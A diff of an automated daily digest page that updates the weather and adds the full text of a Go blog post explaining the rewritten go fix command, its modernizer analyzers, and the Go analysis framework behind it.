@@ -240,8 +240,8 @@
   
       <div class="card">
         <h2>Huginn Daily</h2>
-        <p class="header-p">Tuesday, February 17, 2026</p>
-        <p class="header-p">05bb09a3-d877-4c47-a9f3-9e564645247f</p>
+        <p class="header-p">Wednesday, February 18, 2026</p>
+        <p class="header-p">ac7f88ce-84f4-4c0f-a314-c63916ab5a23</p>
       </div>
   
       <div class="card">
@@ -249,245 +249,1212 @@
         <table class="weather-table">
           <tr>
             <th>Summary</th>
-            <td>⛅️ Mostly cloudy until night.</td>
+            <td>⛅️ Light rain in the morning and windy until night.</td>
           </tr>
           <tr>
             <th>Temperature Range</th>
-            <td>14°C to 19°C (57°F to 66°F)</td>
+            <td>15°C to 17°C (58°F to 63°F)</td>
           </tr>
           <tr>
             <th>Feels Like</th>
-            <td>Low: 53°F | High: 66°F</td>
+            <td>Low: 47°F | High: 57°F</td>
           </tr>
           <tr>
             <th>Humidity</th>
-            <td>76%</td>
+            <td>68%</td>
           </tr>
           <tr>
             <th>Wind</th>
-            <td>18 km/h (11 mph), Direction: 250°</td>
+            <td>33 km/h (21 mph), Direction: 210°</td>
           </tr>
           <tr>
             <th>Precipitation</th>
-            <td>Probability: 100%, Type: No precipitation expected</td>
+            <td>Probability: 100%, Type: rain</td>
           </tr>
           <tr>
             <th>Sunrise / Sunset</th>
-            <td>🌅 06:31 AM / 🌇 05:32 PM</td>
+            <td>🌅 06:30 AM / 🌇 05:33 PM</td>
           </tr>
           <tr>
             <th>Moon Phase</th>
-            <td>Unknown (100%)</td>
+            <td>Waxing Crescent (3%)</td>
           </tr>
           <tr>
             <th>Cloud Cover</th>
-            <td>69%</td>
+            <td>68%</td>
           </tr>
           <tr>
             <th>Pressure</th>
-            <td>1011.75 hPa</td>
+            <td>1010.17 hPa</td>
           </tr>
           <tr>
             <th>Dew Point</th>
-            <td>53.65°F</td>
+            <td>50.14°F</td>
           </tr>
           <tr>
             <th>Visibility</th>
-            <td>6.03 miles</td>
+            <td>5.17 miles</td>
           </tr>
         </table>
       </div>
   
       <div class="card">
-        <h2>XKCD</h2>
+        <h2>Golang</h2>
+        <ul class="item-list">
   
-        <div class="comic">
-          <a href="//imgs.xkcd.com/comics/snews.png" target="_blank">
-            <img src="//imgs.xkcd.com/comics/snews.png" alt="SNEWS">
-          </a>
-        </div>
+          <li>
+            <a href="https://go.dev/blog/gofix" target="_blank">Using go fix to modernize Go code</a>
+            <div class="item-content">
+<div id="blog"><div id="content">
+  <div id="content">
+
+    <div class="Article" data-slug="/blog/gofix">
+    
+    <h1 class="small"><a href="/blog/">The Go Blog</a></h1>
+    
+
+    <h1>Using go fix to modernize Go code</h1>
+      
+      <p class="author">
+      Alan Donovan<br>
+      17 February 2026
+      </p>
+      
+      <div class='markdown'>
+<style>
+.beforeafter {
+  display: grid;
+  font-size: 180%;
+  grid-template-columns: 1fr 2em 1fr;
+  @media screen and (max-width: 57.7rem) {
+    grid-template-columns: 1fr;
+  }
+}
+.beforeafter-arrow {
+  place-self: center;
+}
+.beforeafter-arrow::before {
+  content: "⟶";
+  @media screen and (max-width: 57.7rem) {
+    content: "⇓";
+  }
+}
+</style>
+<p>The 1.26 release of Go this month includes a completely rewritten go fix subcommand. Go fix uses a suite of algorithms to identify opportunities to improve your code, often by taking advantage of more modern features of the language and library. In this post, we’ll first show you how to use <code>go fix</code> to modernize your Go codebase. Then in the <a href="#go/analysis">second section</a> we’ll dive into the infrastructure behind it and how it is evolving. Finally, we’ll present the theme of <a href="#self-service">“self-service”</a> analysis tools to help module maintainers and organizations encode their own guidelines and best practices.</p>
+<!-- see https://go.dev/blog/survey2025#challenges -->
+<h2 id="running-go-fix">Running go fix</h2>
+<p>The <code>go fix</code> command, like <code>go build</code> and <code>go vet</code>, accepts a set of patterns that denote packages. This command fixes all packages beneath the current directory:</p>
+<pre><code>$ go fix ./...
+</code></pre>
+<p>On success, it silently updates your source files. It discards any fix that touches <a href="https://pkg.go.dev/cmd/go#hdr-Generate_Go_files_by_processing_source" rel="noreferrer" target="_blank">generated files</a> since the appropriate fix in that case is to the logic of the generator itself. We recommend running <code>go fix</code> over your project each time you update your build to a newer Go toolchain release. Since the command may fix hundreds of files, start from a clean git state so that the change consists only of edits from go fix; your code reviewers will thank you.</p>
+<p>To preview the changes the above command would have made, use the <code>-diff</code> flag:</p>
+<pre><code>$ go fix -diff ./...
+--- dir/file.go (old)
++++ dir/file.go (new)
+-                       eq := strings.IndexByte(pair, '=')
+-                       result[pair[:eq]] = pair[1+eq:]
++                       before, after, _ := strings.Cut(pair, &quot;=&quot;)
++                       result[before] = after
+…
+</code></pre>
+<p>You can list the available fixers by running this command:</p>
+<pre><code>$ go tool fix help
+…
+Registered analyzers:
+    any          replace interface{} with any
+    buildtag     check //go:build and // +build directives
+    fmtappendf   replace []byte(fmt.Sprintf) with fmt.Appendf
+    forvar       remove redundant re-declaration of loop variables
+    hostport     check format of addresses passed to net.Dial
+    inline       apply fixes based on 'go:fix inline' comment directives
+    mapsloop     replace explicit loops over maps with calls to maps package
+    minmax       replace if/else statements with calls to min or max
+…
+</code></pre>
+<p>Adding the name of a particular analyzer shows its complete documentation:</p>
+<pre><code>$ go tool fix help forvar
+
+forvar: remove redundant re-declaration of loop variables
+
+The forvar analyzer removes unnecessary shadowing of loop variables.
+Before Go 1.22, it was common to write `for _, x := range s { x := x ... }`
+to create a fresh variable for each iteration. Go 1.22 changed the semantics
+of `for` loops, making this pattern redundant. This analyzer removes the
+unnecessary `x := x` statement.
+
+This fix only applies to `range` loops.
+</code></pre>
+<p>By default, the <code>go fix</code> command runs all analyzers. When fixing a large project it may reduce the burden of code review if you apply fixes from the most prolific analyzers as separate code changes. To enable only specific analyzers, use the flags matching their names. For example, to run just the <code>any</code> fixer, specify the <code>-any</code> flag. Conversely, to run all the analyzers <em>except</em> selected ones, negate the flags, for instance <code>-any=false</code>.</p>
+<p>As with <code>go build</code> and <code>go vet</code>, each run of the <code>go fix</code> command analyzes only a specific build configuration. If your project makes heavy use of files tagged for different CPUs or platforms, you may wish to run the command more than once with different values of <code>GOARCH</code> and <code>GOOS</code> for better coverage:</p>
+<pre><code>$ GOOS=linux   GOARCH=amd64 go fix ./...
+$ GOOS=darwin  GOARCH=arm64 go fix ./...
+$ GOOS=windows GOARCH=amd64 go fix ./...
+</code></pre>
+<p>Running the command more than once also provides opportunities for synergistic fixes, as we’ll see below.</p>
+<h3 id="modernizers">Modernizers</h3>
+<p>The introduction of <a href="intro-generics">generics</a> in Go 1.18 marked the end of an era of very few changes to the language spec and the start of a period of more rapid—though still careful—change, especially in the libraries. Many of the trivial loops that Go programmers routinely write, such as to gather the keys of a map into a slice, can now be conveniently expressed as a call to a generic function such as <a href="https://pkg.go.dev/maps#Keys" rel="noreferrer" target="_blank"><code>maps.Keys</code></a>. Consequently these new features create many opportunities to simplify existing code.</p>
+<p>In December 2024, during the frenzied adoption of LLM coding assistants, we became aware that such tools tended—unsurprisingly—to produce Go code in a style similar to the mass of Go code used during training, even when there were newer, better ways to express the same idea. Less obviously, the same tools often refused to use the newer ways even when directed to do so in general terms such as “always use the latest idioms of Go 1.25.” In some cases, even when explicitly told to use a feature, the model would deny that it existed. (See my 2025 GopherCon <a href="https://www.youtube.com/watch?v=_VePjjjV9JU&amp;t=3m50s" rel="noreferrer" target="_blank">talk</a> for more exasperating details.) To ensure that future models are trained on the latest idioms, we need to ensure that these idioms are reflected in the training data, which is to say the global corpus of open-source Go code.</p>
+<p>Over the past year, we have built <a href="https://pkg.go.dev/golang.org/x/tools/go/analysis/passes/modernize" rel="noreferrer" target="_blank">dozens of analyzers</a> to identify opportunities for modernization. Here are three examples of the fixes they suggest:</p>
+<p><strong>minmax</strong> replaces an <code>if</code> statement by a use of Go 1.21’s <code>min</code> or <code>max</code> functions:</p>
+<div class="beforeafter">
+<pre>
+x := f()
+if x &lt; 0 {
+    x = 0
+}
+if x > 100 {
+    x = 100
+}
+</pre>
+<div class="beforeafter-arrow"></div>
+<pre>
+x := min(max(f(), 0), 100)
+</pre>
+</div>
+<p><strong>rangeint</strong> replaces a 3-clause <code>for</code> loop by a Go 1.22 <code>range</code>-over-int loop:</p>
+<div class="beforeafter">
+<pre>
+for i := 0; i &lt; n; i++ {
+    f()
+}
+</pre>
+<div class="beforeafter-arrow"></div>
+<pre>
+for range n {
+    f()
+}
+</pre>
+</div>
+<p><strong>stringscut</strong> (whose <code>-diff</code> output we saw earlier) replaces uses of <code>strings.Index</code> and slicing by Go 1.18’s <code>strings.Cut</code>:</p>
+<div class="beforeafter">
+<pre>
+i := strings.Index(s, ":")
+if i >= 0 {
+     return s[:i]
+}
+</pre>
+<div class="beforeafter-arrow"></div>
+<pre>
+before, _, ok := strings.Cut(s, ":")
+if ok {
+    return before
+}
+</pre>
+</div>
+<p>These modernizers are included in <a href="/gopls">gopls</a>, to provide instant feedback as you type, and in <code>go fix</code>, so that you can modernize several entire packages at once in a single command. In addition to making code clearer, modernizers may help Go programmers learn about newer features. As part of the process of approving each new change to the language and standard library, the <a href="https://go.googlesource.com/proposal/+/master/README.md" rel="noreferrer" target="_blank">proposal</a> review group now considers whether it should be accompanied by a modernizer. We expect to add more modernizers with each release.</p>
+<h2 id="example-a-modernizer-for-go-126s-newexpr">Example: a modernizer for Go 1.26’s new(expr)</h2>
+<p>Go 1.26 includes a small but widely useful change to the language specification. The built-in <code>new</code> function creates a new variable and returns its address. Historically, its sole argument was required to be a type, such as <code>new(string)</code>, and the new variable was initialized to its “zero” value, such as <code>&quot;&quot;</code>. In Go 1.26, the <code>new</code> function may be called with any value, causing it to create a variable initialized to that value, avoiding the need for an additional statement. For example:</p>
+<div class="beforeafter">
+<pre>
+ptr := new(string)
+*ptr = "go1.25"
+</pre>
+<div class="beforeafter-arrow"></div>
+<pre>
+ptr := new("go1.26")
+</pre>
+</div>
+<p>This feature filled a gap that had been discussed for over a decade and resolved one of the most popular <a href="/issue/45624">proposals</a> for a change to the language. It is especially convenient in code that uses a pointer type <code>*T</code> to indicate an optional value of type <code>T</code>, as is common when working with serialization packages such as <a href="https://pkg.go.dev/encoding/json#Marshal" rel="noreferrer" target="_blank">json.Marshal</a> or <a href="https://protobuf.dev/getting-started/gotutorial/" rel="noreferrer" target="_blank">protocol buffers</a>. This is such a common pattern that people often capture it in a helper, such as the <code>newInt</code> function below, saving the caller from the need to break out of an expression context to introduce additional statements:</p>
+<pre><code>type RequestJSON struct {
+    URL      string
+    Attempts *int  // (optional)
+}
+
+data, err := json.Marshal(&amp;RequestJSON{
+    URL:      url,
+    Attempts: newInt(10),
+})
+
+func newInt(x int) *int { return &amp;x }
+</code></pre>
+<p>Helpers such as <code>newInt</code> are so frequently needed with protocol buffers that the <code>proto</code> API itself provides them as <a href="https://pkg.go.dev/google.golang.org/protobuf/proto#Int64" rel="noreferrer" target="_blank"><code>proto.Int64</code></a>, <a href="https://pkg.go.dev/google.golang.org/protobuf/proto#String" rel="noreferrer" target="_blank"><code>proto.String</code></a>, and so on. But Go 1.26 makes all these helpers unnecessary:</p>
+<pre><code>data, err := json.Marshal(&amp;RequestJSON{
+    URL:      url,
+    Attempts: new(10),
+})
+</code></pre>
+<p>To help you take advantage of this feature, the <code>go fix</code> command now includes a fixer, <a href="https://tip.golang.org/src/cmd/vendor/golang.org/x/tools/go/analysis/passes/modernize/newexpr.go" rel="noreferrer" target="_blank">newexpr</a>, that recognizes “new-like” functions such as <code>newInt</code> and suggests fixes to replace the function body with <code>return new(x)</code> and to replace every call, whether in the same package or an importing package, with a direct use of <code>new(expr)</code>.</p>
+<p>To avoid introducing premature uses of new features, modernizers offer fixes only in files that require at least the minimum appropriate version of Go (1.26 in this instance), either through a <a href="/ref/mod#versions"><code>go 1.26</code> directive</a> in the enclosing go.mod file or a <code>//go:build go1.26</code> <a href="https://pkg.go.dev/cmd/go#hdr-Build_constraints" rel="noreferrer" target="_blank">build constraint</a> in the file itself.</p>
+<p>Run this command to update all calls of this form in your source tree:</p>
+<pre><code>$ go fix -newexpr ./...
+</code></pre>
+<p>At this point, with luck, all of your <code>newInt</code>-like helper functions will have become unused and may be safely deleted (assuming they aren’t part of a stable published API). A few calls may remain where it would be unsafe to suggest a fix, such as when the name <code>new</code> is locally shadowed by another declaration. You can also use the <a href="deadcode">deadcode</a> command to help identify unused functions.</p>
+<h2 id="synergistic-fixes">Synergistic fixes</h2>
+<p>Applying one modernization may create opportunities to apply another. For example, this snippet of code, which clamps <code>x</code> to the range 0–100, causes the minmax modernizer to suggest a fix to use <code>max</code>. Once that fix is applied it suggests a second fix, this time to use <code>min</code>.</p>
+<div class="beforeafter">
+<pre>
+x := f()
+if x &lt; 0 {
+    x = 0
+}
+if x > 100 {
+    x = 100
+}
+</pre>
+<div class="beforeafter-arrow"></div>
+<pre>
+x := min(max(f(), 0), 100)
+</pre>
+</div>
+<p>Synergies may also occur between different analyzers. For example, a common mistake is to repeatedly concatenate strings within a loop, resulting in quadratic time complexity—a bug and a potential vector for a denial-of-service attack. The <code>stringsbuilder</code> modernizer recognizes the problem and suggests using Go 1.10’s <code>strings.Builder</code>:</p>
+<div class="beforeafter">
+<pre>
+s := ""
+for _, b := range bytes {
+    s += fmt.Sprintf("%02x", b)
+}
+use(s)
+</pre>
+<div class="beforeafter-arrow"></div>
+<pre>
+var s strings.Builder
+for _, b := range bytes {
+    s.WriteString(fmt.Sprintf("%02x", b))
+}
+use(s.String())
+</pre>
+</div>
+<p>Once this fix is applied, a second analyzer may recognize that the <code>WriteString</code> and <code>Sprintf</code> operations can be combined as <code>fmt.Fprintf(&amp;s, &quot;%02x&quot;, b)</code>, which is both cleaner and more efficient, and offer a second fix. (This second analyzer is <a href="https://staticcheck.dev/docs/checks#QF1012" rel="noreferrer" target="_blank">QF1012</a> from Dominik Honnef’s <a href="https://staticcheck.dev/" rel="noreferrer" target="_blank">staticcheck</a>, which is already enabled in gopls but not yet in <code>go fix</code>, though we <a href="/issue/76918">plan</a> to add staticcheck analyzers to the go command starting in Go 1.27.)</p>
+<p>Consequently, it may be worth running <code>go fix</code> more than once until it reaches a fixed point; twice is usually enough.</p>
+<!-- Aside: The reason the tool does not apply the fixed point iteration itself is that (a) despite our efforts there is a non-zero chance that the transformation breaks the build, preventing most analyzers (those not marked RunDespiteErrors) from running on the second pass, and (b) the transformations in the first round of fixes may add imports for packages whose type information is not available, requiring the “build” to be restarted, which is impossible in many drivers such as Blaze, nogo, Tricorder, etc. Fundamentally this is a consequence of the analysis framework being designed like a distributed build (batch, coarse-grained, distributed pure function) not like an IDE (interactive fine-grained local mutations). -->
+<h3 id="merging-fixes-and-conflicts">Merging fixes and conflicts</h3>
+<p>A single run of <code>go fix</code> may apply dozens of fixes within the same source file. All fixes are conceptually independent, analogous to a set of git commits with the same parent. The <code>go fix</code> command uses a simple three-way merge algorithm to reconcile the fixes in sequence, analogous to the task of merging a set of git commits that edit the same file. If a fix conflicts with the list of edits accumulated so far, it is discarded, and the tool issues a warning that some fixes were skipped and that the tool should be run again.</p>
+<p>This reliably detects <em>syntactic</em> conflicts arising from overlapping edits, but another class of conflict is possible: a <em>semantic</em> conflict occurs when two changes are textually independent but their meanings are incompatible. As an example consider two fixes that each remove the second-to-last use of a local variable: each fix is fine by itself, but when both are applied together the local variable becomes unused, and in Go that’s a compilation error. Neither fix is responsible for removing the variable declaration, but someone has to do it, and that someone is the user of <code>go fix</code>.</p>
+<p>A similar semantic conflict arises when a set of fixes causes an import to become unused. Because this case is so common, the <code>go fix</code> command applies a final pass to detect unused imports and remove them automatically.</p>
+<p>Semantic conflicts are relatively rare. Fortunately they usually reveal themselves as compilation errors, making them impossible to overlook. Unfortunately, when they happen, they do demand some manual work after running <code>go fix</code>.</p>
+<p>Let’s now delve into the infrastructure beneath these tools.</p>
+<p><a name='go/analysis'></a></p>
+<h2 id="the-go-analysis-framework">The Go analysis framework</h2>
+<p>Since the earliest days of Go, the <code>go</code> command has had two subcommands for static analysis, <code>go vet</code> and <code>go fix</code>, each with its own suite of algorithms: “checkers” and “fixers”. A checker reports likely mistakes in your code, such as passing a string instead of an integer as the operand of a <code>fmt.Printf(&quot;%d&quot;)</code> conversion. A fixer safely edits your code to fix a bug or to express the same thing in a better way, perhaps more clearly, concisely, or efficiently. Sometimes the same algorithm appears in both suites when it can both report a mistake and safely fix it.</p>
+<p>In 2017 we redesigned the then-monolithic <code>go vet</code> program to separate the checker algorithms (now called “analyzers”) from the “driver”, the program that runs them; the result was the <a href="https://pkg.go.dev/golang.org/x/tools/go/analysis" rel="noreferrer" target="_blank">Go analysis framework</a>. This separation enables an analyzer to be written once then run in a diverse range of drivers for different environments, such as:</p>
+<ul>
+<li><a href="https://pkg.go.dev/golang.org/x/tools/go/analysis/unitchecker" rel="noreferrer" target="_blank">unitchecker</a>, which turns a suite of analyzers into a subcommand that can be run by the go command’s scalable incremental build system, analogous to a compiler in go build. This is the basis of <code>go fix</code> and <code>go vet</code>.</li>
+<li><a href="https://github.com/bazel-contrib/rules_go/blob/master/go/nogo.rst" rel="noreferrer" target="_blank">nogo</a>, the analogous driver for alternative build systems such as Bazel and Blaze.</li>
+<li><a href="https://pkg.go.dev/golang.org/x/tools/go/analysis/singlechecker" rel="noreferrer" target="_blank">singlechecker</a>, which turns an analyzer into a standalone command that loads, parses, and type-checks a set of packages (perhaps a whole program) and then analyzes them. We often use it for ad hoc experiments and measurements over the module mirror (<a href="https://proxy.golang.org/" rel="noreferrer" target="_blank">proxy.golang.org</a>) corpus.</li>
+<li><a href="https://pkg.go.dev/golang.org/x/tools/go/analysis/multichecker" rel="noreferrer" target="_blank">multichecker</a>, which does the same thing for a suite of analyzers with a ‘swiss-army knife’ CLI.</li>
+<li><a href="/gopls">gopls</a>, the <a href="https://microsoft.github.io/language-server-protocol/" rel="noreferrer" target="_blank">language server</a> behind VS Code and other editors, which provides real-time diagnostics from analyzers after each editor keystroke.</li>
+<li>the highly configurable driver used by the <a href="https://staticcheck.dev/" rel="noreferrer" target="_blank">staticcheck</a> tool. (Staticcheck also provides a large suite of analyzers that can be run in other drivers.)</li>
+<li><a href="https://research.google/pubs/tricorder-building-a-program-analysis-ecosystem/" rel="noreferrer" target="_blank">Tricorder</a>, the batch static analysis pipeline used by Google’s monorepo and integrated with its code review system.</li>
+<li>gopls’ <a href="/gopls/features/mcp">MCP server</a>, which makes diagnostics available to LLM-based coding agents, providing more robust “guardrails”.</li>
+<li><a href="https://pkg.go.dev/golang.org/x/tools/go/analysis/analysistest" rel="noreferrer" target="_blank">analysistest</a>, the analysis framework’s test harness.</li>
+</ul>
+<p>One benefit of the framework is its ability to express helper analyzers that don’t report diagnostics or suggest fixes of their own but instead compute some intermediate data structure that may be useful to many other analyzers, amortizing the costs of its construction. Examples include <a href="https://pkg.go.dev/golang.org/x/tools/go/analysis/passes/ctrlflow" rel="noreferrer" target="_blank">control-flow graphs</a>, the <a href="https://pkg.go.dev/golang.org/x/tools/go/analysis/passes/buildssa" rel="noreferrer" target="_blank">SSA representation</a> of function bodies, and data structures for <a href="https://pkg.go.dev/golang.org/x/tools/go/analysis/passes/inspect" rel="noreferrer" target="_blank">optimized AST navigation</a>.</p>
+<p>Another benefit of the framework is its support for making deductions across packages. An analyzer can attach a “<a href="https://pkg.go.dev/golang.org/x/tools/go/analysis#hdr-Modular_analysis_with_Facts" rel="noreferrer" target="_blank">fact</a>” to a function or other symbol so that information learned while analyzing the function’s body can be used when later analyzing a call to the function, even if the call appears in another package or the later analysis occurs in a different process. This makes it easy to define scalable interprocedural analyses. For example, the printf checker can tell when a function such as <code>log.Printf</code> is really just a wrapper around <code>fmt.Printf</code>, so it knows that calls to <code>log.Printf</code> should be checked in a similar manner. This process works by induction, so the tool will also check calls to further wrappers around <code>log.Printf</code>, and so on. An example of an analyzer that makes heavy use of facts is <a href="https://github.com/uber-go/nilaway" rel="noreferrer" target="_blank">Uber’s nilaway</a>, which reports potential mistakes resulting in nil pointer dereferences.</p>
+
+<p>The process of “separate analysis” in <code>go fix</code>  is analogous to the process of separate compilation in <code>go build</code>. Just as the compiler builds packages starting from the bottom of the dependency graph and passing type information up to importing packages, the analysis framework works from the bottom of the dependency graph up, passing facts (and types) up to importing packages.</p>
+<p>In 2019, as we started developing <a href="/gopls">gopls</a>, the language server for Go, we added the ability for an analyzer to suggest a <a href="https://pkg.go.dev/golang.org/x/tools/go/analysis#SuggestedFix" rel="noreferrer" target="_blank">fix</a> when reporting a diagnostic. The printf analyzer, for example, offers to replace <code>fmt.Printf(msg)</code> with <code>fmt.Printf(&quot;%s&quot;, msg)</code> to avoid misformatting should the dynamic <code>msg</code> value contain a <code>%</code> symbol. This mechanism has become the basis for many of the quick fixes and refactoring features of gopls.</p>
+<p>While all these developments were happening to <code>go vet</code>, <code>go fix</code> remained stuck as it was back before the <a href="/doc/go1compat">Go compatibility promise</a>, when early adopters of Go used it to maintain their code during the rapid and sometimes incompatible evolution of the language and libraries.</p>
+<p>The Go 1.26 release brings the Go analysis framework to <code>go fix</code>. The <code>go vet</code> and <code>go fix</code> commands have converged and are now almost identical in implementation. The only differences between them are the criteria for the suites of algorithms they use, and what they do with computed diagnostics. Go <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.26rc1:src/cmd/vet/main.go;l=62" rel="noreferrer" target="_blank">vet analyzers</a> must detect likely mistakes with low false positives; their diagnostics are reported to the user. Go <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.26rc1:src/cmd/fix/main.go;l=46" rel="noreferrer" target="_blank">fix analyzers</a> must generate fixes that are safe to apply without regression in correctness, performance, or style; their diagnostics may not be reported, but the fixes are directly applied. Aside from this difference of emphasis, the task of developing a fixer is no different from that of developing a checker.</p>
+<h3 id="improving-analysis-infrastructure">Improving analysis infrastructure</h3>
+<p>As the number of analyzers in <code>go vet</code> and <code>go fix</code> continues to grow, we have been investing in infrastructure both to improve the performance of each analyzer and to make it easier to write each new analyzer.</p>
+<p>For example, most analyzers start by traversing the syntax trees of each file in the package looking for a particular kind of node such as a range statement or function literal. The existing <a href="https://pkg.go.dev/golang.org/x/tools/go/ast/inspector" rel="noreferrer" target="_blank">inspector</a> package makes this scan efficient by pre-computing a compact index of a complete traversal so that later traversals can quickly skip subtrees that don’t contain any nodes of interest. Recently we extended it with the <a href="https://pkg.go.dev/golang.org/x/tools/go/ast/inspector#Cursor" rel="noreferrer" target="_blank">Cursor</a> datatype to allow flexible and efficient navigation between nodes in all four cardinal directions—up, down, left, and right, similar to navigating the elements of an HTML DOM—making it easy and efficient to express a query such as “find each go statement that is the first statement of a loop body”:</p>
+<pre><code>    var curFile inspector.Cursor = ...
+
+    // Find each go statement that is the first statement of a loop body.
+    for curGo := range curFile.Preorder((*ast.GoStmt)(nil)) {
+        kind, index := curGo.ParentEdge()
+        if kind == edge.BlockStmt_List &amp;&amp; index == 0 {
+            switch curGo.Parent().ParentEdgeKind() {
+            case edge.ForStmt_Body, edge.RangeStmt_Body:
+                ...
+            }
+        }
+    }
+</code></pre>
+<p>Many analyzers start by searching for calls to a specific function, such as <code>fmt.Printf</code>. Function calls are among the most numerous expressions in Go code, so rather than search every call expression and test whether it is a call to <code>fmt.Printf</code>, it is much more efficient to pre-compute an index of symbol references, which is done by <a href="https://pkg.go.dev/golang.org/x/tools/internal/typesinternal/typeindex" rel="noreferrer" target="_blank">typeindex</a> and its <a href="https://pkg.go.dev/golang.org/x/tools@v0.41.0/internal/analysis/typeindex" rel="noreferrer" target="_blank">helper</a> analyzer. Then the calls to <code>fmt.Printf</code> can be enumerated directly, making the cost proportional to the number of calls instead of to the size of the package. For an analyzer such as <a href="https://pkg.go.dev/golang.org/x/tools/go/analysis/passes/hostport" rel="noreferrer" target="_blank">hostport</a> that seeks an infrequently used symbol (<code>net.Dial</code>), this can easily make it <a href="/cl/657958">1,000× faster</a>.</p>
+<p>Some other infrastructural improvements over the past year include:</p>
+<ul>
+<li>a <strong>dependency graph of the standard library</strong> that analyzers can consult to avoid introducing import cycles. For example, we can’t introduce a call to <code>strings.Cut</code> in a package that is itself imported by <code>strings</code>.</li>
+<li>support for <strong>querying the effective Go version</strong> of a file as determined by the enclosing go.mod file and build tags, so that analyzers don’t insert uses of features that are “too new”.</li>
+<li>a richer <strong>library of refactoring primitives</strong> (e.g. “delete this statement”) that correctly handle adjacent comments and other tricky edge cases.</li>
+</ul>
+<p>We have come a long way, but there remains much to do. Fixer logic can be tricky to get right. Since we expect users to apply hundreds of suggested fixes with only cursory review, it&rsquo;s critical that fixers are correct even in obscure edge cases. As just one example (see my GopherCon <a href="https://www.youtube.com/watch?v=_VePjjjV9JU&amp;t=13m17s" rel="noreferrer" target="_blank">talk</a> for several more), we built a modernizer that replaces calls such as <code>append([]string{}, slice...)</code> by the clearer <code>slices.Clone(slice)</code> only to discover that, when <code>slice</code> is empty, the result of Clone is nil, a subtle behavior change that in rare cases can cause bugs; so we had to exclude <a href="https://pkg.go.dev/golang.org/x/tools/go/analysis/passes/modernize#hdr-Analyzer_appendclipped" rel="noreferrer" target="_blank">that modernizer</a> from the <code>go fix</code> suite.</p>
+<p>Some of these difficulties for authors of analyzers can be ameliorated with better documentation (both for humans and LLMs), particularly checklists of surprising edge cases to consider and test. A pattern-matching engine for syntax trees, similar to those in <a href="https://pkg.go.dev/honnef.co/go/tools/pattern" rel="noreferrer" target="_blank">staticcheck</a> and <a href="https://tree-sitter.github.io/tree-sitter/using-parsers/queries/index.html" rel="noreferrer" target="_blank">Tree Sitter</a>, could simplify the fiddly task of efficiently identifying the locations that need fixing. A richer library of operators for computing accurate fixes would help avoid common mistakes. A better test harness would let us check that fixes don’t break the build, and preserve dynamic properties of the target code. These are all on our roadmap.</p>
+<p><a name='self-service'></a></p>
+<h2 id="the-self-service-paradigm">The “self-service” paradigm</h2>
+<p>More fundamentally, we are turning our attention in 2026 to a “self-service” paradigm.</p>
+<p>The <code>newexpr</code> analyzer we saw earlier is a typical modernizer: a bespoke algorithm tailored to a particular feature. The bespoke model works well for features of the language and standard library, but it doesn’t really help update uses of third-party packages. Although there’s nothing to stop you from writing a modernizer for your own public APIs and running it on your own project, there’s no automatic way to get users of your API to run it too. Your modernizer probably wouldn’t belong in gopls or the <code>go vet</code> suite unless your API is particularly widely used across the Go ecosystem. Even in that case you would have to obtain code reviews and approvals and then wait for the next release.</p>
+<p>Under the self-service paradigm, Go programmers would be able to define modernizations for their own APIs that their users can apply without all the bottlenecks of the current centralized paradigm. This is especially important as the Go community and global Go corpus are growing much faster than the ability of our team to review analyzer contributions.</p>
+<p>The <code>go fix</code> command in Go 1.26 includes a preview of the first fruits of this new paradigm: the <strong>annotation-driven source-level inliner</strong>, which we’ll describe in an upcoming companion blog post next week. In the coming year, we plan to investigate two more approaches within this paradigm.</p>
+<!-- TODO(adonovan): update the reference above when this post is ready: [//go:fix inline and source-level inliner](https://docs.google.com/document/d/16n29TcxMnZoEZtIo8BZcz6PSnh2dakWLSaa6UkROIEQ/edit?resourcekey=0-8QYiy7RDd2QbVAgKDOycoQ) -->
+<p>First, we will be exploring the possibility of <a href="/issue/59869">dynamically loading</a> modernizers from the source tree and securely executing them, either in gopls or <code>go fix</code>. In this approach a package that provides an API for, say, a SQL database could additionally provide a checker for misuses of the API, such as SQL injection vulnerabilities or failure to handle critical errors. The same mechanism could be used by project maintainers to encode internal housekeeping rules, such as avoiding calls to certain problematic functions or enforcing stronger coding disciplines in critical parts of the code.</p>
+<p>Second, many existing checkers can be informally described as “don’t forget to X after you Y!”, such as “close the file after you open it”, “cancel the context after you create it”, “unlock the mutex after you lock it”, “break out of the iterator loop after yield returns false”, and so on. What such checkers have in common is that they enforce certain invariants on all execution paths. We plan to explore generalizations and unifications of these control-flow checkers so that Go programmers can easily apply them to new domains, without complex analytical logic, simply by annotating their own code.</p>
+<p>We hope that these new tools will save you effort during maintenance of your Go projects and help you learn about and benefit from newer features sooner. Please try out <code>go fix</code> on your projects and <a href="/issue/new">report</a> any problems you find, and do share any ideas you have for new modernizers, fixers, checkers, or self-service approaches to static analysis.</p>
+<!--
+Local Variables:
+indent-tabs-mode: nil
+tab-width: 4
+End:
+-->
+</div>
+
+    </div>
+
+    
+    <div class="Article prevnext">
+    
+    
+      
+        <p>
+        
+        
+          
+            <b>Previous article: </b><a href="/blog/go1.26">Go 1.26 is released</a><br>
+          
+        
+        <b><a href="/blog/all">Blog Index</a></b>
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
